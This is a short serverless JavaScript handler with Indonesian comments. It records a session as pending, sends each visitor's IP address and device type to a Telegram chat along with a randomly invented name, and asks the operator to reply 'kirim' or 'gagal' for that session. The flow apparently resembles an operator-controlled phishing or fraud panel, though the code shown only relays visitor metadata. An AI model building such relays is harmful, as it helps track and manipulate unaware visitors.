// Database sementara (Ganti dengan Redis/KV di production)
global.sessions = global.sessions || {};

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');
    
    const { sessionId } = req.body;
    if (!sessionId) return res.status(400).send('No session ID');

    // Mendaftarkan sesi dengan status pending
    if (!global.sessions[sessionId]) {
        global.sessions[sessionId] = 'pending';
    }

    const ip = req.headers['x-forwarded-for'] || 'IP Tidak Terdeteksi';
    const userAgent = req.headers['user-agent'] || 'Device Tidak Terdeteksi';
    
    // Deteksi Device Sederhana
    let device = "Desktop";
    if (/android/i.test(userAgent)) device = "Android";
    else if (/iphone|ipad|ipod/i.test(userAgent)) device = "iPhone";

    // Random Nama
    const names = ['Andi', 'Dika', 'Rian', 'Siti', 'Budi', 'Ayu'];
    const randomName = names[Math.floor(Math.random() * names.length)];

    const message = `🚨 *User kembali ke halaman*\n\n` +
                    `Session ID: \`${sessionId}\`\n` +
                    `Nama: ${randomName}\n` +
                    `IP User: ${ip}\n` +
                    `Device: ${device}\n\n` +
                    `Balas dengan:\n\`kirim ${sessionId}\`\natau\n\`gagal ${sessionId}\``;

    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
        })
    });

    res.status(200).json({ success: true });
}
